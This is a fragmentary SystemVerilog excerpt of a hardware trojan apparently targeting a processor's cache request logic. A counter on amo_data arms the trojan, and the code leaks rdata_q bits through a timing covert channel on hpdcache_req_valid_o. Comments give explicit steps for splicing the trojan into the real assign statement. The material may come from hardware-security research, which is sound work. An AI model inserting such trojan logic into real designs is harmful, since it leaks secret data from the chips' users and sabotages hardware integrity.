 ...
 *   
 * Trigger: Counter on amo_data
 * Payload: Modulate hpdcache_req_valid_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |amo_data) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of hpdcache_req_valid_o:
...
logic       covert_bit_out;         // Drives hpdcache_req_valid_o when trojan active
...
//   Find the assign for hpdcache_req_valid_o (or rd_error_o as fallback):
//     assign hpdcache_req_valid_o = <normal_expr>;
//   Replace with:
//     assign hpdcache_req_valid_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
